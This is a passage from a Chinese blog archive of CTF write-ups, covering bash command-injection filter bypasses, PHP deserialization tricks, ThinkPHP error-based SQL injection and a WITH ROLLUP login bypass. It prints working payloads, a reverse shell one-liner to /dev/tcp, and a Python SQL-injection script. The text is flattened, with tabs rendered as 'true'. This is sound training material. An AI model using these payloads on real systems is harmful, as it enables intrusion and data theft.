echo 222222，成功发现输出 22222 ，我们也可以使用() { _; } &gt;_[$($())] { whoami; }这个 payload 发现当前用户为www-data，而我们之前发现根目录flag的权限为-r-------- 1 flag root 37 Jan 9 2018 flag，所以不能直接读取，但是有一个flag-reader与flag-reader.c的文件，这应该是题目提示了。因为index.php又把flag关键字屏蔽了，我们也不能直接读取flag-reader.c，但是我们这里可以利用通配符读取，例如使用fla*.c 使用() { _; } &gt;_[$($())] { cat /fla*.c; }得到flag-reader.c源码 Flag-reader.c: 123456789101112131415161718192021222324252627282930313233#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]){truechar buff[4096], rnd[16], val[16];trueif(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) {truetruewrite(1, \"Not enough random\\n\", 18);true}truesetuid(1337);trueseteuid(1337);truealarm(1);truewrite(1, &amp;rnd, sizeof(rnd));trueread(0, &amp;val, sizeof(val));trueif(memcmp(rnd, val, sizeof(rnd)) == 0) {truetrueint fd = open(argv[1], O_RDONLY);truetrueif(fd &gt; 0) {truetruetrueint s = read(fd, buff, 1024);truetruetrueif(s &gt; 0) {truetruetruetruewrite(1, buff, s);truetruetrue}truetruetrueclose(fd);truetrue} else {truetruetruewrite(1, \"Can not open file\\n\", 18);truetrue}true} else {truetruewrite(1, \"Wrong response\\n\", 16);true}} 使用bash -c \"sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1\"直接反弹 shell 运行flag-reader 审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就write(1, \"Wrong response\\n\", 16);… 然而我在回弹 shell 之后，利用/tmp可写的权限，貌似有点小问题，一旦cat /tmp/zedd，链接就断掉了，无奈只能找其他文件夹，发现/run/lock与/var/tmp均可读可写，使用/flag-reader flag &gt; /run/lock/zedd &lt; /run/lock/zedd写入 flag 反弹 shell 使用cat非常容易断掉，最好使用执行的方式，最后得到 flag 上篇的解释与补充特殊变量这里再对上篇进行一定的补充与解释。 $n 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第二个参数是$2(0&lt;n&lt;9) ${n} 9&lt;n时需要加上大括号 例如，脚本文件如下 12345#!/bin/bashecho \"File Name: $0\"echo \"First Parameter : $1\"echo \"First Parameter : $2\" 执行脚本文件 1234$ ./test.sh Hello ZeddFile Name: ./test.shFirst Parameter : HelloSecond Parameter : Zedd 而当没有参数的时候，$n就为空，所以我们可以用cat /fl$1ag这样绕过关键字过滤，并且在 bash 环境下 12$ echo $0bash 所以我们可以使用这样的 payload ，可以用在 bash 这个关键字过滤但是有需要用到 bash 的情况下，前提是环境用的是 bash 12$ {printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|$0flag{xxx} $IFSIFS(Internal Field Seprator) ，内部域分隔符，Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。 而 IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。 12345$ echo $IFS$ echo \"$IFS\" | od -b0000000 040 011 012 0120000004 我们可以看到直接输出IFS是看不到的，把它转化为二进制就可以看到了，”040”是空格，”011”是Tab，”012”是换行符”\\n” 。最后一个 012 是因为 echo 默认是会换行的。 $?上个命令的退出状态，或函数的返回值。退出状态是一个数字，一般情况下，大部分命令执行成功会返回0，失败返回1。不过，也有一些命令返回其他值，表示不同类型的错误。 $当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。 12$ echo $$75576 $#传递给脚本或函数的参数个数。 脚本文件内容： 123#!/bin/bashecho \"Total Number of Parameters : $#\" 执行命令 12$ ./test.sh Hello ZeddTotal Number of Parameters : 2 $*与$@都是传递给脚本或函数的所有参数。 脚本文件内容： 1234#!/bin/bashecho \"Quoted Values: $@\"echo \"Quoted Values: $*\" 执行命令： 123$ ./test.sh Hello ZeddQuoted Values: Hello ZeddQuoted Values: Hello Zedd 它们不被双引号(“ “)包含时，都以”1””2” … “$n” 的形式输出所有参数。 但是当它们被双引号(“ “)包含时，”∗”会将所有的参数作为一个整体，以”1 2…n”的形式输出所有参数；”@”会将各个参数分开，以”1” “2”…”n” 的形式输出所有参数。 内置变量绕过上篇其实提到了一点内置变量绕过，但是讲的也不并不多，只是大概提了一下。这里再给一些常用的 bash 内置的环境变量 $BASH12$ echo $BASH/usr/local/bin/bash 返回 bash 二进制文件的路径 $HOME12$ $HOMEbash: /Users/zedd: Is a directory 返回当前用户所属目录 $PWD12$ echo $PWD/ 显示当前目录 $OLDPWD12$ echo $OLDPWD/Users/zedd/Desktop/ 返回上次所在目录 $PATH12$ echo $PATH/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin 环境变量$PATH $PS112$ echo $PS1\\s-\\v\\$ 看到的命令行主要提示 $PS212$ echo $PS2&gt; 额外输入的辅助提示，表示为&gt;，$PS3是 Shell 脚本中使用select时的提示符，显示为空，这里就不再单独列举了 $PS412$ echo $PS4+ 与set -x配合用来修改跟踪输出的前缀，显示为+ 举个🌰Layer7 CTF 2018可以访问https://cat.canhack.me/这个在线地址 题目描述1234This service provides read the file.https://cat.canhack.me/This challenge was published in the Layer7 CTF in 2018. WriteUp点进去发现有 1&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href=\"/?file=test.txt\"&gt;this&lt;/a&gt;. 跟进得到test.txt的内容 猜测为文件包含，尝试直接读取flag被waf，直接读取https://cat.canhack.me/?file=index.php 12345678910111213141516&lt;?phptrueerror_reporting(0);truerequire __DIR__.'/flag-f72a161d445915d2bdcdc820c4143353.php';trueif(isset($_GET['file'])){truetrueif(preg_match('/flag|\\'|\\\"|`|\\\\\\\\|;|\\(|\\)|\\*|\\?|\\.\\.|\\//i', $_GET['file'])){truetruetruedie('no hack');truetrue}truetruesystem('cat \"'.$_GET['file'].'\"');true}else{truetrueecho '&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href=\"/?file=test.txt\"&gt;this&lt;/a&gt;.';true} 还剩下{}、&lt;&gt;、[]、+-=、^、$、@、!、&amp;，是个关键字绕过，有$，我们很快可以联想到可以用$n这种方式绕过，最终 payload 1https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php 参考：Internal Variables Shell中的IFS解惑 Shell 特殊变量 一个有趣的任意文件读写 利用通配符进行Linux本地提权 Unix Wildcards Gone Wild","link":"/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/"},{"title":"安恒1月周周练","text":"闲来无事想起安恒开了1月的周周练，就拿来练练手。 自己只做了web的部分。 Web1 easy题目很直接的给出了源码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php @error_reporting(1); include 'flag.php';class baby { public $file; function __toString() { if(isset($this-&gt;file)) { $filename = \"./{$this-&gt;file}\"; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET['data'])) { $data = $_GET['data']; preg_match('/[oc]:\\d+:/i',$data,$matches); if(count($matches)) { die('Hacker!'); } else { $good = unserialize($data); echo $good; } } else { highlight_file(\"./index.php\"); } ?&gt; 很明显的一个php反序列化漏洞，但是需要绕过/[oc]:\\d+:/i这个条件，而我们对象序列化出来的必须是 1O:num:\"name\":1:{...} 这么一个格式，逃不过这个正则的判断，也找到了php序列化的开头字母代表。 123456a - array b - boolean d - double i - integero - common object r - references - string C - custom objectO - class N - nullR - pointer reference U - unicode string 尝试用不同的字母绕过，比如说用R，但是试了一下不行。也参考了一下PHP string序列化与反序列化语法解析不一致带来的安全隐患，发现或许有什么序列化的小trick，也常使用科学计数法或者十六进制绕过，但是直接报错了。 然后发现了php反序列unserialize的一个小特性，可以在O:4:中间加入+，变成O:+4:这样，与原效果一致，主要原因就是因为php对+的词法解析是做了再看下一位判断。 所以这题只要加上+绕过就好了，记得用url编码就好。 123?data=O:+4:\"baby\":1:{s:4:\"file\";s:8:\"flag.php\";}?data=O%3A%2B4%3A\"baby\"%3A1%3A%7Bs%3A4%3A\"file\"%3Bs%3A8%3A\"flag.php\"%3B%7D 得到flag Web2 ezweb2发现Cookie里有user=dXNlcg%3D%3D，base64解码得到user=user，尝试改为admin，直接进入到了admin.php的后台。 随便试了一下，发现是个命令执行。命令执行可以参考我上篇文章，巧用命令注入的N种方式。 ls可以得到 随便fuzz了一下，发现可以用cat&lt;&gt;config.php直接读取文件，文件内容如下。 Config.php: 12345678&lt;?phpsession_start();function waf_exec($str){true$black_str = \"/(;|&amp;|&gt;|}|{|%|#|!|\\?|@|\\+| )/i\";truetrue$str = preg_replace($black_str, \"\",$str);truetruereturn $str;true} Admin.php 1234567891011121314151617181920&lt;?phpinclude 'config.php';if (!isset($_SESSION['admin'])||$_SESSION['admin']===false) {truedie(\"You are not admin...\");}if (@$_POST['cmd']) {true$cmd = waf_exec($_POST['cmd']);true$retval = array();trueexec($cmd, $retval, $status);true// var_dump($retval);trueif ($status == 0) {truetrue$res = implode(\"\\n\",$retval);true}else{truetrue$res = 'error';true}}else{true$res = '';}include './templates/admin.html'; index.php 12345678910111213141516&lt;?phpinclude 'config.php';$userdata = @$_COOKIE['user'];if (!$userdata) {truesetcookie(\"user\",base64_encode('user'));true$_SESSION['admin'] = false;}else{true$user = base64_decode($userdata);trueif ($user == 'admin') {truetrue$_SESSION['admin'] = true;truetrueheader(\"Location: admin.php\");true}}include './templates/index.html'; 找了几个目录都找不到flag，看来应该要到列目录才可以，但是又过滤了空格，就没办法用ls ..这样，但是绕过空格的方法很多，我们这里直接用ls$IFS/绕过空格。 看到flag文件名字，直接读就好了。 总结整体来说题目还是不错的。还是可以学到一点东西的。尤其是web1的小trick，对于在绕waf也有一定的作用。","link":"/2019/01/22/%E5%AE%89%E6%81%921%E6%9C%88%E5%91%A8%E5%91%A8%E7%BB%83/"},{"title":"安恒1月月赛","text":"安恒1月月赛复现wp Webbabygo ​ babygo（提交你找到的字符串的md5值） 题目源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?php @error_reporting(1); include 'flag.php';class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new sec; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = \"./{$this-&gt;filename}\"; if (file_get_contents($file)) { return file_get_contents($file); } else { return \"you must be joking!\"; } } } } class sec { function read() { return \"it's so sec~~\"; } } if (isset($_GET['data'])) { $Input_data = unserialize($_GET['data']); echo $Input_data; } else { highlight_file(\"./index.php\"); } ?&gt; 感觉是一叶飘零师傅出的题2333…还是学习到了一点知识的 这题考查的就是 PHP 对象注入，@l3m0n 师傅这篇写的比较好，其他 csdn 的博客写的简直惨不忍睹，php对象注入-pop链的构造，其实关键点就是反序列化可以控制类属性，无论是private还是public。我们可以在本地先生成自己需要的就好了 如下，直接把__construct方法里面的改成$this-&gt;skyobj = new cool;就可以调用 cool-&gt;read()了，然后直接用$this-&gt;amazing = NULL;绕过$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb，其实不传也可以，反正都是NULL，整个题就结束了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?php // @error_reporting(1); // include 'flag.php';class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-&gt;skyobj = new cool; $this-&gt;amazing = NULL; } function __toString() { if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); } } class cool { public $filename = \"flag.php\"; public $nice; public $amzing; function read() { echo \"Nice!\"; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) { $file = \"./{$this-&gt;filename}\"; if (file_get_contents($file)) { return file_get_contents($file); } else { return \"you must be joking!\"; } } } } class sec { function read() { return \"it's so sec~~\"; } } $obj = new baby;echo urlencode(serialize($obj));// $obj-&gt;aaa-&gt;amazing = new baby;// if (isset($_GET['data'])) // { // $Input_data = unserialize($_GET['data']);// echo $Input_data; // } // else // { // highlight_file(\"./test.php\"); // } ?&gt; Simple php访问robots.txt发现有后台 123456User-agent: *Disallow: /ebooksDisallow: /adminDisallow: /xhtml/?Disallow: /center 访问admin，使用admin/12345678成功登录，登录后有一个搜索功能 结合页面thinkphp 3.2的框架漏洞，使用以下 payload 逐渐获得 flag 123456789101112131415161718search[where]=3 and 1=updatexml(1,concat(0x7,(select schema_name from information_schema.schemata limit 3,1),0x7e),1);%23search[where]=3 and 1=updatexml(1,concat(0x7,(select group_concat(table_name) from information_schema.tables where table_schema='tpctf'),0x7e),1);%23search[where]=3 and 1=updatexml(1,concat(0x7,(select group_concat(flag) from flag),0x7e),1);%23search[where]=3 and 1=updatexml(1,concat(0x7,(select flag from flag limit 0,1),0x7e),1);%23search[where]=3 and 1=updatexml(1,concat(0x3a,(select flag from flag limit 0,1)),1);%23search[where]=3 and extractvalue(1,concat(0x5c,(select flag from flag limit 0,1)));%23search[where]=3 and (select 1 from (select count(),concat((select (select (select flag from flag limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a);%23search[where]=3 and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7,flag,0x7e) FROM flag limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);%23select 1 from(select count(*),concat((select (select (SELECT concat(0x7,flag,0x7e) FROM flag limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a 结果发现提交不对，然后看了其他师傅的 wp 发现少了一位，然后搜了一下相关资料，应该是限制了输出 尝试了很多，也用了floor尝试报错注入不限制输出，但是用floor本地成功了，但是一打服务就 pending 了，很是郁闷，最后用substr(str,32,1)得到了最后的一个数6 1search[where]=3 and extractvalue(1,concat(0x5c,substr((select flag from flag limit 0,1),32,1)));%23 贴一下脚本： 123456789101112131415161718192021import HackRequests as hackurl = \"http://101.71.29.5:10010/Admin/User/Index?search[where]=3%20and%20extractvalue(1,concat(0x5c,substr((select%20flag%20from%20flag%20limit%200,1),32,1)));%23\"loginurl = \"http://101.71.29.5:10010/admin/index/login\"# hh = hack.httpraw(raw)header = '''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheCookie: PHPSESSID=6qm8l5phgs6hkva4fpndkp1p70; path=/'''proxy = ('185.32.44.22','80')user = \"user=admin&amp;password=12345678\"# hh = hack.http(loginurl,headers=header,proxy=proxy,post=user)hh = hack.http(url,headers=header,proxy=proxy)print(hh.header)print(hh.text()) 顺便提一下，这个登录我看其他师傅 wp 是通过 sql 约束攻击登录 admin 账户的…并非弱口令，我猜 sql 语句应该是 1select * from users where username = \"xxx\" and passowrd = \"xxx\" 而且注册密码是8位数的话，肯定应该有师傅是弄的 12345678 …2333","link":"/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/"},{"title":"2019安恒周周练西湖论剑特别版","text":"安恒开了周周练西湖论剑特别版，那就做一下吧 WebWeb 1 WebScanDescription某公司的网站遭受到黑客攻击，存放在Apache配置文件中的重要信息被黑客盗取了。公司员工为了验证成因，使用明鉴Web应用弱点扫描器扫描网站并导出漏洞报告，你能通过分析漏洞报告得出黑客可能是采用哪种漏洞盗取重要信息的么？被盗取的重要信息是什么？ 报告地址：https://xpro-resource.91ctf.com/5c149c800c81e.pdf 题目地址：http://101.71.29.5:10009 Hacking题目给了几个洞，一个盲注，一个目录穿越文件包含 尝试直接用 sqlmap 的 sql_shell 进行操作，发现secure_file_priv为空，尝试用load_file()读源码，发现读不了，写到/tmp/目录下用文件包含也不行，远程包含不行，本地包含屏蔽了关键字php，含有php的字符串都会被 Forbidden 。 尝试读配置文件view-source:http://101.71.29.5:10009/index.php?act=about&amp;file=/etc/httpd/conf/httpd.conf，然后查找 log 的位置，想用文件包含 log 拿 shell 123456/var/log/httpd/error_log/var/log/apache2/error.log/var/log/httpd-error.log/var/log/apache/access.log/var/log/apache2/access.log/var/log/httpd/access.log 然而后来想想，题目应该是用的file_get_content()函数，而不是include的操作，即使有 php 代码，也应该无法解析。 然后瞎看配置文件的时候，发现 flag … Web 2 刀塔Description无论你喜欢打Dota还是LOL，都进网站里学习一下吧！ 题目地址：http://101.71.29.5:10010 Hacking非预期扫目录得到 www.zip ，打开在 flag.php 找到 flag 正常解在 index.php 中可以看到 1234567891011121314151617181920case 'news': if(isset($_GET['nid'])){ if(preg_match(\"/[a-zA-Z]/\",$_GET['nid'])){ exit(\"Illegal operation!\"); }elseif(strlen($_GET[nid])&gt;5){ exit(\"Illegal operation!\"); }else{ echo \"&lt;p class=lead&gt;\"; system(\"head ./news/\" . $_GET['nid']); echo \"&lt;/p&gt;\"; } }else{ echo \"&lt;h3&gt;&lt;a href=index.php?act=news&amp;nid=1&gt;鱼人守卫&lt;/a&gt;&lt;/h3&gt;\"; echo \"&lt;h3&gt;&lt;a href=index.php?act=news&amp;nid=2&gt;黑暗游侠&lt;/a&gt;&lt;/h3&gt;\"; echo \"&lt;h3&gt;&lt;a href=index.php?act=news&amp;nid=3&gt;血魔&lt;/a&gt;&lt;/h3&gt;\"; } break; 可以看到这里用了system，正则只允许用字母，这里我们可以直接用通配符绕过就行了。直接head上级目录act=news&amp;nid=../* Web 3 美男子Description我还是想安静的做一个美男子！ 题目地址：http://101.71.29.5:10011 Hacking源代码得到index.phps 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpinclude 'global.php';function AttackFilter($StrKey,$StrValue,$ArrReq){ if(is_array($StrValue)) { $StrValue=implode($StrValue); } if (preg_match(\"/\".$ArrReq.\"/is\",$StrtValue)==1){ print \"holy shit!\"; exit(); } } $filter = \"union|select|from|where|join|sleep|benchmark|,|\\(|\\)\";foreach($_POST as $key=&gt;$value){ AttackFilter($key,$value,$filter);}if(!isset($_POST['key1']) || !isset($_POST['key2'])) { print &lt;&lt;&lt;DBAPP&lt;img src='image/img.jpg' /&gt;&lt;!--index.phps--&gt;DBAPP; die;}$query = mysql_query(\"SELECT * FROM tb_ctf WHERE key1 = '{$_POST['key1']}'\"); if(mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key['key2'] == $_POST['key2']) { print $flag; }else{ print \"Error!\"; }}else{ print \"Error!\";} 看了一下题目，注入点在 key1 处，可以用单引号闭合，但是需要查询结果得到的 key2 与传入的 key2 相等才能拿到 flag。我猜测是不是可以有类似 limit 或者 union 的操作， 控制查询的 key2 我们就可以传入控制点了 然后我就发现竟然是个原题…PHDays 2013 CTF “Blade” Writeup，利用了GROUP BY WITH ROLLUP，相关文档：GROUP BY Modifiers 大概效果就是以下这个样子： 123456789101112131415MariaDB [test]&gt; select * from user where id =1 GROUP BY id WITH ROLLUP LIMIT 1 OFFSET 1;+------+----------+--------+| id | username | passwd |+------+----------+--------+| NULL | admin | admin |+------+----------+--------+1 row in set (0.001 sec)MariaDB [test]&gt; select * from user where id =1 GROUP BY username WITH ROLLUP LIMIT 1 OFFSET 1;+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | NULL | admin |+----+----------+--------+1 row in set (0.000 sec) 所以这里我们只需要让 key2 为空就行了。 1key1=' or 1=1 GROUP BY key2 WITH ROLLUP LIMIT 1 OFFSET 1;#&amp;key2= Web 4 Easy LoginDescriptionEasy Login…So Easy… 题目地址：http://101.71.29.5:10017 然而题目没开… Web 5 Be Allowed?Description小黑终于闯进了内网，找到了目标Web主机，但是却被做了限制！ 题目地址：http://101.71.29.5:10016 然而题目没开… Web 6 我的博客Description年轻不懂事，没事写博客。写出这么个东西，这可是一整个博客啊。(答案为flag{}形式，提交{}中内容即可) 题目地址：http://101.71.29.5:10015 然而题目没开… Conclusion明天就是正式比赛了，后面这几个没开的题目大概也不会开了。前几个还是学到了一点东西，主要是 web 3 学习到了WITH ROLLUP的用法，还是有点收获的，其他就比较水了。","link":"/2019/04/06/%E5%AE%89%E6%81%92%E5%91%A8%E5%91%A8%E7%BB%83%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%89%B9%E5%88%AB%E7%89%88/"},{"title":"2019掘安杯Web","text":"清明无聊，玩了一下这个 ctf 比赛 WebWeb 1 web签到Descriptionflag到底在哪啊！！ 题目地址：http://120.79.1.69:8887/web1/ Hacking Web 2 下载下载Description下载就对了，废什么话！ 题目地址：http://120.79.1.69:8887/web2/ Hacking题目给了一个文件下载的功能，http://120.79.1.69:8887/web2/?file=flag.txt 直接下 flag.php ，内容为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpheader('Content-Type: text/html; charset=utf-8'); //网页编码function encrypt($data, $key) {true$key = md5 ( $key );true$x = 0;true$len = strlen ( $data );true$l = strlen ( $key );truefor($i = 0; $i &lt; $len; $i ++) {truetrueif ($x == $l) {truetruetrue$x = 0;truetrue}truetrue$char .= $key {$x};truetrue$x ++;true}truefor($i = 0; $i &lt; $len; $i ++) {truetrue$str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );true}truereturn base64_encode ( $str );}function decrypt($data, $key) {true$key = md5 ( $key );true$x = 0;true$data = base64_decode ( $data );true$len = strlen ( $data );true$l = strlen ( $key );truefor($i = 0; $i &lt; $len; $i ++) {truetrueif ($x == $l) {truetruetrue$x = 0;truetrue}truetrue$char .= substr ( $key, $x, 1 );truetrue$x ++;true}truefor($i = 0; $i &lt; $len; $i ++) {truetrueif (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {truetruetrue$str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );truetrue} else {truetruetrue$str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );truetrue}true}truereturn $str;}$key=\"MyCTF\";$flag=\"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=\";//encrypt($flag,$key)?&gt; 直接用decrypt函数解就行了…得到myCTF{cssohw456954GUEB} Web 3 猜密码Description这题很简单 题目地址：http://120.79.1.69:8887/web3/ Hacking直接看源码 1234567891011121314151617181920212223&lt;html&gt;&lt;head&gt;&lt;title&gt;猜密码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- session_start();$_SESSION['pwd']=time();if (isset ($_POST['password'])) {trueif ($_POST['pwd'] == $_SESSION['pwd'])truetruedie('Flag:'.$flag);trueelse{truetrueprint '&lt;p&gt;猜测错误.&lt;/p&gt;';truetrue$_SESSION['pwd']=time().time();true}}--&gt;&lt;form action=\"index.php\" method=\"post\"&gt;密码：&lt;input type=\"text\" name=\"pwd\"/&gt;&lt;input type=\"submit\" value=\"猜密码\"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 直接点击提交获得 flag 这里确实存在疑问，后来仔细看了看确实有点问题。 因为注释当中的是 POST[‘password’] 而非 POST[‘pwd’] 如果没有传入$_POST['password']是肯定不能执行后面代码的，这是存疑的一点，后来猜测应该是服务器代码跟注释肯定不一致才导致的问题。但是当时直接点就拿到 flag 就没有再去深究，后来这题我在群里看了也产生了比较多的讨论，后来群主也给出了源代码 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpheader('Content-Type: text/html; charset=utf-8'); //网页编码$flag=\"jactf{sfakdjgnasasdasde}\";session_start();if (isset ($_POST['pwd'])){trueif ($_POST['pwd'] == $_SESSION['pwd'])truetruedie('Flag:'.$flag);trueelse{truetrueprint '&lt;p&gt;猜测错误.&lt;/p&gt;';truetrue$_SESSION['pwd']=time().time();true}}?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;猜密码&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- session_start();$_SESSION['pwd']=time();if (isset ($_POST['password'])) {trueif ($_POST['pwd'] == $_SESSION['pwd'])truetruedie('Flag:'.$flag);trueelse{truetrueprint '&lt;p&gt;猜测错误.&lt;/p&gt;';truetrue$_SESSION['pwd']=time().time();true}}--&gt;&lt;form action=\"web3.php\" method=\"post\"&gt;密码：&lt;input type=\"text\" name=\"pwd\"/&gt;&lt;input type=\"submit\" value=\"猜密码\"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 于是这个问题就得以解释了。只要传参$_POST['pwd']为空的话，$_SESSION['pwd']未设置也为空，也就拿到了 flag 了。 Web 4 该网站已被黑Description如何预防网站被黑？把不必要的端口修改或者关闭、使用web防火墙、使用cdn隐藏IP、使用安全狗。有技术可以代码审计修复0day漏洞 题目地址：http://120.79.1.69:8887/web4/ Hacking猜测有后门，打开 shell.php，爆一下密码为 hack Web 5 曲折的人生Description曲折是人生的常态当你遇到坎坷时，不妨把曲折的人生看作是一种常态，不要悲观失望，不要长吁短叹，不要停滞不前，把走弯路看成是前行的另一种形式，另一种途径，这样你也可以像那些走弯路的河流有勇气，抵达那遥远的人生大海。 题目地址：http://120.79.1.69:8887/web5/ Hacking 随便提交我们可以发现有一个错误返回 1select id,username,password from `admin` where username='admin'&lt;br/&gt;用户名:admin不正确 过滤了 or union select ，但是大写就可以绕过，空格过滤用%0a绕过，用username=admin'%0aUNION%0aSELECT%0a1,2,3#，发现 2 那一列被回显，所以可以在 2 处查询 12345&lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECT1,2,3#'&lt;br/&gt;用户名:2正确 &lt;/div&gt; 用username=admin' UNION SELECT 1,group_concat(schema_name),3 from infORmation_schema.schemata#得到 1234567&lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECT1,group_concat(schema_name),3frominfORmation_schema.schemata#'&lt;br/&gt;用户名:information_schema,xiaowei正确 &lt;/div&gt; 表名： 123456789 &lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECT1,group_concat(table_name),3frominfORmation_schema.tableswheretable_schema='xiaowei'#'&lt;br/&gt;用户名:admin正确 &lt;/div&gt; 列名： 123456789&lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECT1,group_concat(column_name),3frominfORmation_schema.columnswheretable_name='admin'#'&lt;br/&gt;用户名:id,username,password正确 &lt;/div&gt; 用户名： 1234567&lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECTid,username,3fromadmin#'&lt;br/&gt;用户名:goodboy_g-60Hellowor正确 &lt;/div&gt; 密码： 1234567&lt;div class=\"tip\"&gt; select id,username,password from `admin` where username='admin'UNIONSELECTid,password,3fromadmin#'&lt;br/&gt;用户名:ajahas&amp;&amp;*44askldajaj正确 &lt;/div&gt; 登录成功后： 1&lt;div&gt;the package password is &lt;span&gt;%^$%&amp;sss88ioiern.gdsgj&lt;/span&gt;&lt;/div&gt;&lt;div&gt;the package download link=&gt;&lt;a href='sss88ioiern.gdsgj.zip' target='_blank'&gt;代码审计.zip&lt;/a&gt;&lt;/div&gt; 自己用的脚本： 12345678910111213141516171819202122232425262728293031323334index_url = 'http://120.79.1.69:8887/web5/index.php'solution_url = 'http://120.79.1.69:8887/web5/?check'headers = {true'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',true'Content-Type': 'application/x-www-form-urlencoded'}proxies = {true'http':'http://127.0.0.1:8080'}r = requests.Session()s = r.get(index_url,allow_redirects=True,headers=headers)str_text = r\"&lt;div class='rep'&gt;.*&lt;/div&gt;\"match = re.search(str_text,s.text)result = match.group().replace(\"&lt;div class='rep'&gt;\",\"\")result = result.replace(\"&lt;/div&gt;\",\"\")result = result.replace(\"ï¼\",\"(\")result = result.replace(\"ï¼\",\")\")result = result.replace(\"X\",\"*\")result = result.replace(\"/\",\"/\")result = result.replace(b'\\xc2\\x89'.decode(),\"\")result = str(round(eval(result)))print(result)# param = \"username=admin'+||+'1'#&amp;password=admin&amp;code=\" + result# param = \"username=admin' UNION SELECT 1,group_concat(schema_name),3 from infORmation_schema.schemata#&amp;password=admin&amp;code=\" + result# param = \"username=admin' UNION SELECT 1,group_concat(table_name),3 from infORmation_schema.tables where table_schema='xiaowei'#&amp;password=admin&amp;code=\" + result# param = \"username=admin' UNION SELECT id,group_concat(id),3 from admin#&amp;password=admin&amp;code=\" + resultparam = \"username=admin'+||+'1'#&amp;password=ajahas%26%26*44askldajaj&amp;code=\" +resultparam = param.replace(' ',\"%0a\")# print(param)s = r.post(solution_url,data=param,headers=headers,proxies=proxies)print(s.text) 这里比较坑的就是要处理那些不可见字符，我都是直接复制过来的，以及最后还有个不可见字符，用result = 